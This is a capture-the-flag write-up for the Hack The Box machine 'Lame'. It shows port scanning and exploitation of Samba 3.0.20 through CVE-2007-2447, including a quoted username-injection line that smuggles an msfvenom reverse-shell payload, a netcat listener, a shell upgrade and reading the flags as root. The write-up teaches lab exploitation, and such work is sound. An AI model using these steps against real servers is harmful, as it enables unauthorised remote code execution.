# HTB Lame

First thing to do is start scanning for open ports.

```bash
âžœ  ~ sudo nmap -sV -sC -T4 -p- 10.10.10.3

We have several open ports

<table><thead><tr><th width="191">Port</th><th>Description</th></tr></thead><tbody><tr><td>21</td><td>FTP has anonymous access enabled. Its vsftpd 2.3.4 which has serveral vulnerablities like RCE. In this box it could not be exploited.</td></tr><tr><td>22</td><td>SSH, in cases bruteforcing credentials is possible. Certain versions have vulnerablities.</td></tr><tr><td>139</td><td>Samba uses it for older clients</td></tr><tr><td>445</td><td>Samba or SMB running Samba 3.0.20 which is vulnerable to Remote Code Execution.</td></tr></tbody></table>

### <mark style="color:yellow;">CVE-2007-2447</mark>

Samba 3.0.20 also known as the usermap script vulnerablitiy. We can embed a payload in a malicious username with shell metacharachters. When authenticating the server will execute the command in the username. Below a working python script that works.

{% embed url="https://github.com/n3rdh4x0r/CVE-2007-2447" %}

Run the python script

```bash
 python3 samba.py -lh 10.10.14.18 -lp 443 -t 10.10.10.3
```

Listen with netcat:

```bash
nc -lvnp 443
```

{% hint style="info" %}
The script works by using msfvenom to create the payload. The vulnerability lies in the username where we see on line 49:\\

It saves the msfvenom payload in the buf variable\
`buf = generate_payload(args.lh, int(args.lp)).decode()`

\
In the userID variable where we call the buf variable and thus the msfvenom payload will be executed. Using nohup will keep processes/jobs running.

``userID = "/=` nohup " + buf + ""``
{% endhint %}

### <mark style="color:yellow;">Reverse shell</mark>

After running the script we will get connection on our netcat listener on port 443. Often when getting a shell we find we have a very limited shell and things `ctrl + l` dont work. We can upgrade our shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Then type `ctrl + z`.

```bash
stty raw -echo; fg
exptort TERM=xterm
```

With a more functional shell we can get the flags. By checking our right we find we are root user and so we can get user and root flag.

```bash
root@lame: find / -name user.txt 2>/dev/null
/home/makis/user.txt

root@lame: cat /home/makis/user.txt
<redacted>

root@lame: cat /root/root.txt
<redacted>
```
